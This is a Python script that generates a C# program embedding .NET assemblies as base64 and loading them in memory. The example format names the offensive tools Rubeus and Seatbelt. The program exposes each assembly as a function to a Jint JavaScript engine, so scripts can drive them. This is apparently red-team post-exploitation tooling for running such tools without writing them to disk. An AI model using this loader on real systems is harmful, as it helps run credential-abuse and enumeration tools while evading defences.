#!/usr/bin/env python3
import sys
import base64

prog_head_template = """
using Jint;
using System;
using System.Text;
using System.IO;
using System.Reflection;

class Program
{
"""

prog_tail_template = """
}
"""

engine_template = """
    public static void Print(object s)
    {
        if (s == null)
            s = "null";
        Console.WriteLine(s.ToString());
    }

    private static Jint.Engine CreateEngine()
    {
        return new Engine()
            FUNCTION_CALLS
            .SetValue("print", new Action<object>(Print));
    }
"""

func_template = '.SetValue("ASSEMBLY_NAME", new Func<String, String>(ASSEMBLY_NAME_CAP))'

assembly_template = """
    static String ASSEMBLY_NAME_CAP(String param) {
        var lib = "BASE64_ASSEMBLY";
        byte[] lib_bytes = Convert.FromBase64String(lib);
        var assembly = Assembly.Load(lib_bytes);
        MethodInfo method = assembly.EntryPoint;
        var sw = new StringWriter();
        Console.SetOut(sw);
        Console.SetError(sw);

        object[] parameters = new[] { new System.String[] { param } };
        method.Invoke(null, parameters);
        Console.Out.Close();
        var sw1 = new StreamWriter(Console.OpenStandardOutput());
        sw1.AutoFlush = true;
        Console.SetOut(sw1);
        return sw.ToString();
    }
"""

main_template = """
    static void Main(string[] args)
    {
        // Place the user source here
        var source = @"
               <SCRIPT>
        ";
        var s = CreateEngine().Execute(source).GetCompletionValue();
        Console.WriteLine(s.AsString());
    }
"""

"""
SCRIPT FORMAT
<-----
rubeus = /path/to/rubeus
seatbelt = /path/to/seatbelt
------>
JS Script
"""
if __name__ == "__main__":
    with open(sys.argv[1]) as in_script:
        imports_list = False
        import_builder = list()
        script = ""
        for line in in_script:
            if line.startswith("<-----"):
                imports_list = True
            elif line.startswith("----->"):
                imports_list = False
            elif imports_list:
                entry = line.split('=')
                import_builder.append((entry[0].strip(), entry[1].strip()))
            else:
                script += line + '\n'

    func_list = ""
    lib_list = ""
    for ass in import_builder:
        lib_tmp = ""
        func_tmp = func_template.replace("ASSEMBLY_NAME_CAP", ass[0].capitalize())
        func_list += func_tmp.replace("ASSEMBLY_NAME", ass[0])
        lib_tmp += assembly_template.replace("ASSEMBLY_NAME_CAP", ass[0].capitalize())
        with open(ass[1], 'rb') as rf:
            lib_b64 = base64.b64encode(rf.read()).decode('ascii')
        lib_list += lib_tmp.replace("BASE64_ASSEMBLY", lib_b64)


    with open('out.cs', 'w') as prog:
        prog.write(prog_head_template)
        prog.write(lib_list)
        prog.write(engine_template.replace("FUNCTION_CALLS", func_list))
        prog.write(main_template.replace("<SCRIPT>", script.replace('"', '""')))
        prog.write(prog_tail_template)

    print("mcs out.cs -r:Jint.dll")
